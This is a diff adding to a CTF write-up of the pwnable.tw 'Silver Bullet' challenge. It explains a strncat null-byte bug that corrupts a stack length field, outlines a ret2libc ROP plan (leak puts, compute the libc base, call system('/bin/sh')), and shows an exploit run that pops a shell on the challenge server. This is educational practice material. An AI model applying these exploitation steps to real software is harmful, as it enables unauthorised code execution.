@@ -1,7 +1,8 @@
 # Silver Bullet
 
 ...Is an interesting pwnable from "pwnable.tw".                           
-I decided to post a wp as i found it pretty damn fun.
+I decided to post a wp as i found it pretty damn fun.                 
+We are given a 32bit binary and a libc.
 ```console
 root@kali:~/CTF/pwnable_tw# checksec ./silver_bullet
 [*] '/root/CTF/pwnable_tw/silver_bullet'
@@ -155,6 +156,51 @@ From strncat's man page:
                    
 And this is the exact bug in play here. (probably shouldv'e read the man page eh?)         
                  
-Because of this, if our appended description and original description, when added, are of exactly 0x30 length, the 'power'\length buffer on the stack after it is overwritten with 0 (terminating null-byte) and allows to add 0x30 more characters and corrupt into the stack.                
+Because of this, if our appended description and original description, when added, are of exactly 0x30 length, the power/length buffer on the stack after it is overwritten with 0 (terminating null-byte) and allows to add 0x30 more characters, thus corrupting the stack.                
          
 ## Exploitation:
+Because of the NX but no PIE or stack canary the exploit path is relatively clear:           
+1.Exploit main, construct a rop chain prints the virtual address of a libc function (I chose puts).         
+2.Calculate the libc base, and from there calculate the address of "/bin/sh" inside libc and of the system function.           
+3.Call main again, and exploit it once again.              
+4.Call system("/bin/sh")              
+                
+```console
+root@kali:~/CTF/pwnable_tw# python3 sploit.py 
+[+] Opening connection to chall.pwnable.tw on port 10103: Done
+[*] '/root/CTF/pwnable_tw/silver_bullet'
+    Arch:     i386-32-little
+    RELRO:    Full RELRO
+    Stack:    No canary found
+    NX:       NX enabled
+    PIE:      No PIE (0x8048000)
+puts addr: 0xf7582140
+libc base: 0xf7523000
+[*] Switching to interactive mode
+Sorry ... It still alive !!
+Give me more power !!
++++++++++++++++++++++++++++
+       Silver Bullet       
++++++++++++++++++++++++++++
+ 1. Create a Silver Bullet 
+ 2. Power up Silver Bullet 
+ 3. Beat the Werewolf      
+ 4. Return                 
++++++++++++++++++++++++++++
+Your choice :>----------- Werewolf -----------<
+ + NAME : Gin
+ + HP : 1052688107
+>--------------------------------<
+Try to beat it .....
+Oh ! You win !!
+$ cd home
+$ ls
+silver_bullet
+$ cd silver_bullet
+$ ls
+flag
+run.sh
+silver_bullet
+$ cat flag
+FLAG{*REDACTED*}
+```
